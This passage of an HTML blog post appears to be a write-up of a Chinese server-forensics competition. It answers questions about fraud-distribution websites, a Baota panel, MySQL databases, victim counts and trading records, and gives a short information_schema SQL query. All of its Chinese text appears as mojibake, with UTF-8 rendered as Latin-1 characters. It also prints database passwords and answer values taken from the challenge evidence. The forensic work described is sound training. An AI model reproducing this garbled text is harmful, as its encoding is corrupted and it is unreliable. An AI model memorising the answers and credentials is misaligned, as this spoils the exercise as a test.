src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125044234.png" class="">  </p><h2 id="9-åˆ†å‘ç½‘ç«™sb-wiiudot-cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰"><a href="#9-åˆ†å‘ç½‘ç«™sb-wiiudot-cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰" class="headerlink" title="9.åˆ†å‘ç½‘ç«™sb.wiiudot.cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰"></a>9.åˆ†å‘ç½‘ç«™sb.wiiudot.cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125420925.png" class="">  <img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125504701.png" class="">  <p><img src="%E9%99%87%E4%BF%A12023/IMG_20241028-125650246.png" alt="<img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-125504701.png" class="">   1">  </p><h2 id="10-åˆ†å‘ç½‘ç«™sb-wiiudot-cnæœ¬åœ°æ•°æ®åº“ç”¨æˆ·sbwiiudotcnçš„å¯†ç æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰"><a href="#10-åˆ†å‘ç½‘ç«™sb-wiiudot-cnæœ¬åœ°æ•°æ®åº“ç”¨æˆ·sbwiiudotcnçš„å¯†ç æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰" class="headerlink" title="10.åˆ†å‘ç½‘ç«™sb.wiiudot.cnæœ¬åœ°æ•°æ®åº“ç”¨æˆ·sbwiiudotcnçš„å¯†ç æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰"></a>10.åˆ†å‘ç½‘ç«™sb.wiiudot.cnæœ¬åœ°æ•°æ®åº“ç”¨æˆ·sb<em>wiiudot<em>cnçš„å¯†ç æ˜¯<strong>_</strong></em></em>ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-130102289.png" class="">  <img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-130122116.png" class="">  <p>æˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸¤ä¸ªå¯†ç åœ¨å®å¡”ä¸­çš„æ˜¯lSfXN770ZPjte9måœ¨å¤‡ä»½æ–‡ä»¶ä¸­çš„æ˜¯KE5f3xnFHYAnG5Dtï¼Œè€Œé¢˜ç›®é—®çš„æ˜¯æœ¬åœ°çš„æ•°æ®åº“å¯†ç ï¼Œè€Œå®å¡”ä¸­çš„å¯†ç æ˜¯è¿œç«¯æœåŠ¡å™¨çš„mysqlå¯†ç æ‰€ä»¥è¿™ä¸ªé¢˜çš„ç­”æ¡ˆåº”è¯¥æ˜¯KE5f3xnFHYAnG5Dt</p><h1 id="æœåŠ¡å™¨å–è¯2"><a href="#æœåŠ¡å™¨å–è¯2" class="headerlink" title="æœåŠ¡å™¨å–è¯2"></a>æœåŠ¡å™¨å–è¯2</h1><h2 id="1-è¯·åˆ†æå®å¡”é¢æ¿ä¸­é»˜è®¤å»ºç«™ç›®å½•æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-etc-wwwï¼‰"><a href="#1-è¯·åˆ†æå®å¡”é¢æ¿ä¸­é»˜è®¤å»ºç«™ç›®å½•æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š-etc-wwwï¼‰" class="headerlink" title="1.è¯·åˆ†æå®å¡”é¢æ¿ä¸­é»˜è®¤å»ºç«™ç›®å½•æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/etc/wwwï¼‰"></a>1.è¯·åˆ†æå®å¡”é¢æ¿ä¸­é»˜è®¤å»ºç«™ç›®å½•æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š/etc/wwwï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-175005246.png" class="">  <h2 id="2-åœ¨å®å¡”æ•°æ®åº“ç›®å½•æœ‰ä¸€ä¸ªåªå«æœ‰ä¸€ä¸ªè¡¨ç»“æ„çš„æ•°æ®åº“ï¼Œè¯·æ‰¾åˆ°è¯¥â€œè¡¨ç»“æ„æ–‡ä»¶â€å¹¶åˆ†æå‡ºç¬¬å…­ä¸ªå­—æ®µçš„å­—æ®µç±»å‹æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šint-11-ï¼‰"><a href="#2-åœ¨å®å¡”æ•°æ®åº“ç›®å½•æœ‰ä¸€ä¸ªåªå«æœ‰ä¸€ä¸ªè¡¨ç»“æ„çš„æ•°æ®åº“ï¼Œè¯·æ‰¾åˆ°è¯¥â€œè¡¨ç»“æ„æ–‡ä»¶â€å¹¶åˆ†æå‡ºç¬¬å…­ä¸ªå­—æ®µçš„å­—æ®µç±»å‹æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šint-11-ï¼‰" class="headerlink" title="2.åœ¨å®å¡”æ•°æ®åº“ç›®å½•æœ‰ä¸€ä¸ªåªå«æœ‰ä¸€ä¸ªè¡¨ç»“æ„çš„æ•°æ®åº“ï¼Œè¯·æ‰¾åˆ°è¯¥â€œè¡¨ç»“æ„æ–‡ä»¶â€å¹¶åˆ†æå‡ºç¬¬å…­ä¸ªå­—æ®µçš„å­—æ®µç±»å‹æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šint(11)ï¼‰"></a>2.åœ¨å®å¡”æ•°æ®åº“ç›®å½•æœ‰ä¸€ä¸ªåªå«æœ‰ä¸€ä¸ªè¡¨ç»“æ„çš„æ•°æ®åº“ï¼Œè¯·æ‰¾åˆ°è¯¥â€œè¡¨ç»“æ„æ–‡ä»¶â€å¹¶åˆ†æå‡ºç¬¬å…­ä¸ªå­—æ®µçš„å­—æ®µç±»å‹æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šint(11)ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-175850483.png" class="">  <p>å’Œå‰é¢çš„ä¸€æ ·ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡ä¿®æ”¹é…ç½®æ¥ç™»é™†mysqlï¼Œç„¶åé€šè¿‡Navicatæ¥æŸ¥çœ‹<br>ä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½é€šè¿‡Navicatæ¥çœ‹è¿™ä¸ªæ•°æ®åº“ï¼Œå¥½æ€ªï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç«çœ¼æ¥çœ‹<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-180538550.png" class=""><br>Char(128)</p><h2 id="3-è¯·åˆ†æâ€œä¹äº«é‡‘èâ€ç½‘ç«™ç»‘å®šçš„åŸŸåæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šwww-baidu-comï¼‰"><a href="#3-è¯·åˆ†æâ€œä¹äº«é‡‘èâ€ç½‘ç«™ç»‘å®šçš„åŸŸåæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šwww-baidu-comï¼‰" class="headerlink" title="3.è¯·åˆ†æâ€œä¹äº«é‡‘èâ€ç½‘ç«™ç»‘å®šçš„åŸŸåæ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šwww.baidu.comï¼‰"></a>3.è¯·åˆ†æâ€œä¹äº«é‡‘èâ€ç½‘ç«™ç»‘å®šçš„åŸŸåæ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šwww.baidu.comï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-175256810.png" class="">  <p>æˆ‘ä»¬æ‰“å¼€ä¼šçœ‹ä¸åˆ°ç½‘ç«™æ ï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å¡èœå•æ¥å¼€å¯æ˜¾ç¤º<br>æˆ‘ä»¬å¯ä»¥å‘ç°åªæœ‰ä¸€ä¸ªç½‘ç«™é‚£è¿™ä¸ªå°±åº”è¯¥æ˜¯ç»‘å®šçš„åŸŸåäº†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-180717296.png" class="">  </p><h2 id="4-è¯·è®¿é—®â€œä¹äº«é‡‘èâ€æ•°æ®åº“å¹¶æ‰¾åˆ°ç”¨æˆ·è¡¨ï¼Œå‡è®¾å¯†ç ä¸º123456ï¼Œè¿˜åŸuidä¸º2909ï¼Œç”¨æˆ·åä¸ºgoyashaåŠ å¯†åå¯†ç çš„å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabcdefghijklmnopqrstuvwsyzï¼‰"><a href="#4-è¯·è®¿é—®â€œä¹äº«é‡‘èâ€æ•°æ®åº“å¹¶æ‰¾åˆ°ç”¨æˆ·è¡¨ï¼Œå‡è®¾å¯†ç ä¸º123456ï¼Œè¿˜åŸuidä¸º2909ï¼Œç”¨æˆ·åä¸ºgoyashaåŠ å¯†åå¯†ç çš„å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabcdefghijklmnopqrstuvwsyzï¼‰" class="headerlink" title="4.è¯·è®¿é—®â€œä¹äº«é‡‘èâ€æ•°æ®åº“å¹¶æ‰¾åˆ°ç”¨æˆ·è¡¨ï¼Œå‡è®¾å¯†ç ä¸º123456ï¼Œè¿˜åŸuidä¸º2909ï¼Œç”¨æˆ·åä¸ºgoyashaåŠ å¯†åå¯†ç çš„å€¼æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabcdefghijklmnopqrstuvwsyzï¼‰"></a>4.è¯·è®¿é—®â€œä¹äº«é‡‘èâ€æ•°æ®åº“å¹¶æ‰¾åˆ°ç”¨æˆ·è¡¨ï¼Œå‡è®¾å¯†ç ä¸º123456ï¼Œè¿˜åŸuidä¸º2909ï¼Œç”¨æˆ·åä¸ºgoyashaåŠ å¯†åå¯†ç çš„å€¼æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabcdefghijklmnopqrstuvwsyzï¼‰</h2><p>å› ä¸ºæˆ‘ä»¬åé¢çš„é¢˜ç›®éƒ½è¦çœ‹æºç å’Œä¿®å¤ç½‘ç«™ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠå®å¡”çš„æºç å‹ç¼©åä¸‹è½½ä¸‹æ¥ï¼Œçœ‹åˆ°ä¼šæ›´æ¸…æ¥šä¸€ç‚¹<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-181526103.png" class=""><br>é¢˜ç›®é—®æˆ‘ä»¬åŠ å¯†ç»“æœ,å…¶å®å°±æ˜¯è€ƒåŠ å¯†é€»è¾‘<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-182919388.png" class=""><br>æˆ‘ä»¬æ‰¾ä¸€ä¸‹æ•°æ®åº“çš„utime<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-182558802.png" class=""></p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-182831989.png" class="">  <p>å¾—åˆ°ç»“æœ</p><h2 id="5-è¯·é‡å»ºâ€œä¹äº«é‡‘èâ€ï¼Œè®¿é—®å¹³å°å‰å°ç™»é™†ç•Œé¢ï¼Œä¼šå‘˜ç™»é™†ç•Œé¢é¡¶éƒ¨LOGOä¸Šçš„å‡ ä¸ªå­—æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šçˆ±é‡‘èï¼‰"><a href="#5-è¯·é‡å»ºâ€œä¹äº«é‡‘èâ€ï¼Œè®¿é—®å¹³å°å‰å°ç™»é™†ç•Œé¢ï¼Œä¼šå‘˜ç™»é™†ç•Œé¢é¡¶éƒ¨LOGOä¸Šçš„å‡ ä¸ªå­—æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šçˆ±é‡‘èï¼‰" class="headerlink" title="5.è¯·é‡å»ºâ€œä¹äº«é‡‘èâ€ï¼Œè®¿é—®å¹³å°å‰å°ç™»é™†ç•Œé¢ï¼Œä¼šå‘˜ç™»é™†ç•Œé¢é¡¶éƒ¨LOGOä¸Šçš„å‡ ä¸ªå­—æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šçˆ±é‡‘èï¼‰"></a>5.è¯·é‡å»ºâ€œä¹äº«é‡‘èâ€ï¼Œè®¿é—®å¹³å°å‰å°ç™»é™†ç•Œé¢ï¼Œä¼šå‘˜ç™»é™†ç•Œé¢é¡¶éƒ¨LOGOä¸Šçš„å‡ ä¸ªå­—æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šçˆ±é‡‘èï¼‰</h2><h3 id="ç½‘ç«™é‡æ„æ–¹æ³•"><a href="#ç½‘ç«™é‡æ„æ–¹æ³•" class="headerlink" title="ç½‘ç«™é‡æ„æ–¹æ³•"></a>ç½‘ç«™é‡æ„æ–¹æ³•</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹å…¶mysqlåœ°å€æ˜¯127.0.0.1å³ä¸ç”¨ä¿®æ”¹,è€Œå…¶ç½‘ç«™è¿è¡Œæ–¹å¼ç«Ÿç„¶æ˜¯é™æ€çš„,æ‰€ä»¥æˆ‘ä»¬å°†å…¶æ”¹ä¸ºphp,ä¸”phpç‰ˆæœ¬è¦ç¨å¾®é«˜ç‚¹,å› ä¸ºä½ç‰ˆæœ¬å¹¶ä¸é€‚é…<code>__DIR__</code>ä¼šå€’ç½®æŠ¥é”™<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184043079.png" class=""> </p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184225011.png" class="">  <p>ç„¶åæ˜¯ä¿®æ”¹å™¨è¿è¡Œç›®å½•,æˆ‘ä»¬å¯ä»¥å‘ç°å…¶è¿è¡Œç›®å½•æ˜¯publicåº”è¯¥ä¸ºç½‘ç«™æ ¹ç›®å½•æ‰å¯¹</p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184157299.png" class="">  <img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-184438558.png" class="">  <p>å…¶å«ç¿æ–‡åŒ–,çœŸéš¾çœ‹é˜¿</p><h2 id="6-åˆ†å‘ç½‘ç«™sb-wiiudot-cnä¸€å…±å­˜æ”¾äº†-æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰-1"><a href="#6-åˆ†å‘ç½‘ç«™sb-wiiudot-cnä¸€å…±å­˜æ”¾äº†-æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰-1" class="headerlink" title="6.åˆ†å‘ç½‘ç«™sb.wiiudot.cnä¸€å…±å­˜æ”¾äº†_æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰"></a>6.åˆ†å‘ç½‘ç«™sb.wiiudot.cnä¸€å…±å­˜æ”¾äº†<strong><em>_</em></strong>æ¡é€šè®¯å½•æ•°æ®ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1234ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190217142.png" class="">  <p>å¯ä»¥çœ‹åˆ°pcidä¸º5çš„ä¸ºå¤–æ±‡,ä¸”æˆ‘ä»¬è¦ä¸»è¦æ¯åˆ é™¤çš„å•†å“<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190132978.png" class="">  </p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190059199.png" class="">  <p>å¯ä»¥æ‰¾åˆ°ä¸¤ä¸ª</p><h2 id="7-å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰-åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡-ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰-1"><a href="#7-å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰-åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡-ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰-1" class="headerlink" title="7.å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰_åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡,ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰"></a>7.å…¨éƒ¨ç½‘ç«™ä¸€å…±æœ‰<strong><em>_</em></strong>åå—å®³äººã€‚ï¼ˆæ ¼å¼ï¼šxxxã€‚ä¸å»é‡,ä¸è¿›è¡Œæ•°æ®æ¢å¤ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-190655306.png" class="">  <h2 id="8-åˆ†å‘ç½‘ç«™tf-chongwuxiaoyouxi-comé‡Œé¢ä¸€å…±æœ‰-ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰-1"><a href="#8-åˆ†å‘ç½‘ç«™tf-chongwuxiaoyouxi-comé‡Œé¢ä¸€å…±æœ‰-ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰-1" class="headerlink" title="8.åˆ†å‘ç½‘ç«™tf.chongwuxiaoyouxi.comé‡Œé¢ä¸€å…±æœ‰_ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰"></a>8.åˆ†å‘ç½‘ç«™tf.chongwuxiaoyouxi.comé‡Œé¢ä¸€å…±æœ‰<strong><em>_</em></strong>ä½â€œç»„å‘˜çº§åˆ«â€çš„ç®¡ç†å‘˜ã€‚ï¼ˆæ ¼å¼ï¼šæ•°å­—ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-191429074.png" class="">  <p>åœ¨å­—æ®µåä¸­å­˜åœ¨å¤‡æ³¨.<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-191409561.png" class=""><br>æˆ‘ä»¬éœ€è¦æŸ¥çœ‹å˜åŒ–é‡‘é¢å³accountå¤§äº582402çš„å’Œtitleä¸ºå……å€¼.<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-191326955.png" class=""><br>å†ä½¿ç”¨SUMå‡½æ•°æ±‚å’Œ</p><h2 id="9-åˆ†å‘ç½‘ç«™sb-wiiudot-cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰-1"><a href="#9-åˆ†å‘ç½‘ç«™sb-wiiudot-cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯-ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰-1" class="headerlink" title="9.åˆ†å‘ç½‘ç«™sb.wiiudot.cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯_ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰"></a>9.åˆ†å‘ç½‘ç«™sb.wiiudot.cnç®¡ç†å‘˜åä¸ºâ€œ0820â€çš„é‚€è¯·ç æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ¼å¼ï¼šxxxï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-192007943.png" class="">  <p>ä½†ä¸æ˜¯å¼ æ•™ç˜¦<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-192413090.png" class=""><br>é€šè¿‡uidå¯ä»¥å†userinfoé‡Œæ‰¾åˆ°å«kongxin</p><h2 id="10-è¯·åˆ†æâ€œä¹äº«é‡‘èâ€å»ºä»“æ—¶é—´ä¸ºâ€œ2022-03-01-18-44-01â€ï¼Œå¹³ä»“æ—¶é—´ä¸ºâ€œ2022-03-01-18-52-01â€ï¼Œä»¥å¤ªåŠ-æ³°è¾¾å¸çš„è¿™ä¸€ç¬”äº¤æ˜“çš„å¹³ä»“ä»·æ ¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1888-668ï¼‰"><a href="#10-è¯·åˆ†æâ€œä¹äº«é‡‘èâ€å»ºä»“æ—¶é—´ä¸ºâ€œ2022-03-01-18-44-01â€ï¼Œå¹³ä»“æ—¶é—´ä¸ºâ€œ2022-03-01-18-52-01â€ï¼Œä»¥å¤ªåŠ-æ³°è¾¾å¸çš„è¿™ä¸€ç¬”äº¤æ˜“çš„å¹³ä»“ä»·æ ¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1888-668ï¼‰" class="headerlink" title="10.è¯·åˆ†æâ€œä¹äº«é‡‘èâ€å»ºä»“æ—¶é—´ä¸ºâ€œ2022/03/01 18:44:01â€ï¼Œå¹³ä»“æ—¶é—´ä¸ºâ€œ2022/03/01 18:52:01â€ï¼Œä»¥å¤ªåŠ/æ³°è¾¾å¸çš„è¿™ä¸€ç¬”äº¤æ˜“çš„å¹³ä»“ä»·æ ¼æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1888.668ï¼‰"></a>10.è¯·åˆ†æâ€œä¹äº«é‡‘èâ€å»ºä»“æ—¶é—´ä¸ºâ€œ2022/03/01 18:44:01â€ï¼Œå¹³ä»“æ—¶é—´ä¸ºâ€œ2022/03/01 18:52:01â€ï¼Œä»¥å¤ªåŠ/æ³°è¾¾å¸çš„è¿™ä¸€ç¬”äº¤æ˜“çš„å¹³ä»“ä»·æ ¼æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1888.668ï¼‰</h2><p>æ•°æ®åº“æŸ¥ç€æŸ¥ç€getåˆ°ä¸€ä¸ªå°éªšæ‹›ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨å¦‚ä¸‹è¯­å¥æ¥å¯¼å‡ºæ•°æ®åº“çš„æ‰€æœ‰æ³¨é‡Š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME, COLUMN_COMMENT </span><br><span class="line"><span class="keyword">FROM</span> information_schema.COLUMNS </span><br><span class="line"><span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> <span class="string">&#x27;sjp&#x27;</span> </span><br></pre></td></tr></table></figure><br>ç„¶åå°±å¯ä»¥åˆ©ç”¨é¢˜ç›®çš„å…³é”®æ€§è¿›è¡Œå¿«é€Ÿå®šä½ï¼Œå½“ç„¶äº†å¦‚æœæ²¡å®šä½åˆ°ä¹Ÿå°±è¦è‡ªå·±æ…¢æ…¢æ‰¾äº†<br>ä¹Ÿå¯ä»¥ç›´æ¥å†å…¨å±€æœï¼Œè¿™æ ·æ•ˆç‡ä¼šæ¯”ä¸€ä¸ªä¸ªæ‰¾å—å¾ˆå¤š<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-193714783.png" class="">  </p><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-193642577.png" class="">  <p>å½“ç„¶è¿™åªæ˜¯å®šä½å¾ˆå¤šåœ°æ–¹è¿˜æ˜¯å¾—éœ€è¦sqlè¯­å¥çš„<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-194439738.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å»ºä»“å’Œå¹³ä»“çš„æ—¶é—´ä¸ºæ—¶é—´æˆ³ã€‚è½¬æ¢è¿è¡Œä½¿ç”¨sqlè¯­å¥æŸ¥è¯¢<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-194419333.png" class="">  </p><p>2896.924</p><h2 id="11-è¯·åˆ†æâ€œä¹äº«é‡‘èâ€è®¢å•ç¼–å·ä¸ºâ€œ202112090946233262â€å¹³ä»“æ—¶é—´æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2022-1-11-1-22-43ï¼‰"><a href="#11-è¯·åˆ†æâ€œä¹äº«é‡‘èâ€è®¢å•ç¼–å·ä¸ºâ€œ202112090946233262â€å¹³ä»“æ—¶é—´æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2022-1-11-1-22-43ï¼‰" class="headerlink" title="11.è¯·åˆ†æâ€œä¹äº«é‡‘èâ€è®¢å•ç¼–å·ä¸ºâ€œ202112090946233262â€å¹³ä»“æ—¶é—´æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2022-1-11.1:22:43ï¼‰"></a>11.è¯·åˆ†æâ€œä¹äº«é‡‘èâ€è®¢å•ç¼–å·ä¸ºâ€œ202112090946233262â€å¹³ä»“æ—¶é—´æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2022-1-11.1:22:43ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195120195.png" class="">  <p>ä¸€æŸ¥å¥½å®¶ä¼™å•¥ä¹ŸæŸ¥ä¸åˆ°ã€‚<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195044849.png" class=""><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®å¡”æœ‰å¤‡ä»½ï¼Œæˆ‘ä»¬æŠŠå®å¡”å¤‡ä»½å¯¼å…¥è¯•è¯•<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195237969.png" class=""><br>å¯¼å…¥åå°±å¯ä»¥æŸ¥åˆ°äº†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-195318521.png" class=""><br>2021-12-09 09:52:23</p><h2 id="12-å®å¡”é¢æ¿æŸç”¨æˆ·æ›¾å°è¯•è¿›è¡Œä¸€æ¬¡POSTè¯·æ±‚ï¼Œå‚æ•°ä¸ºâ€œ-BTCloud-action-UploadFilesDataâ€ï¼Œè¯·é—®è¯¥ç”¨æˆ·ç–‘ä¼¼ä½¿ç”¨çš„ï¼ˆ-ï¼‰ç”µè„‘ç³»ç»Ÿè¿›è¡Œè®¿é—®è¯·æ±‚çš„ã€‚"><a href="#12-å®å¡”é¢æ¿æŸç”¨æˆ·æ›¾å°è¯•è¿›è¡Œä¸€æ¬¡POSTè¯·æ±‚ï¼Œå‚æ•°ä¸ºâ€œ-BTCloud-action-UploadFilesDataâ€ï¼Œè¯·é—®è¯¥ç”¨æˆ·ç–‘ä¼¼ä½¿ç”¨çš„ï¼ˆ-ï¼‰ç”µè„‘ç³»ç»Ÿè¿›è¡Œè®¿é—®è¯·æ±‚çš„ã€‚" class="headerlink" title="12.å®å¡”é¢æ¿æŸç”¨æˆ·æ›¾å°è¯•è¿›è¡Œä¸€æ¬¡POSTè¯·æ±‚ï¼Œå‚æ•°ä¸ºâ€œ/BTCloud?action=UploadFilesDataâ€ï¼Œè¯·é—®è¯¥ç”¨æˆ·ç–‘ä¼¼ä½¿ç”¨çš„ï¼ˆ ï¼‰ç”µè„‘ç³»ç»Ÿè¿›è¡Œè®¿é—®è¯·æ±‚çš„ã€‚"></a>12.å®å¡”é¢æ¿æŸç”¨æˆ·æ›¾å°è¯•è¿›è¡Œä¸€æ¬¡POSTè¯·æ±‚ï¼Œå‚æ•°ä¸ºâ€œ/BTCloud?action=UploadFilesDataâ€ï¼Œè¯·é—®è¯¥ç”¨æˆ·ç–‘ä¼¼ä½¿ç”¨çš„ï¼ˆ ï¼‰ç”µè„‘ç³»ç»Ÿè¿›è¡Œè®¿é—®è¯·æ±‚çš„ã€‚</h2><p>å®å¡”çš„æ—¥å¿—å†/www/server/panel/logs/æ–‡ä»¶å¤¹ä¸‹<br>å†ç«çœ¼é‡Œåªæœ‰å‡ ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥å†ä»¿çœŸçš„æœåŠ¡å™¨é‡Œå°†æ–‡ä»¶å¯¼å‡º<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-200713651.png" class=""><br>ç„¶åå‹ç¼©åˆ°åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹è¿›è¡Œæœç´¢<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-200744136.png" class=""><br>å…¶UAå¤´çš„ç‰ˆæœ¬ä¸ºNT 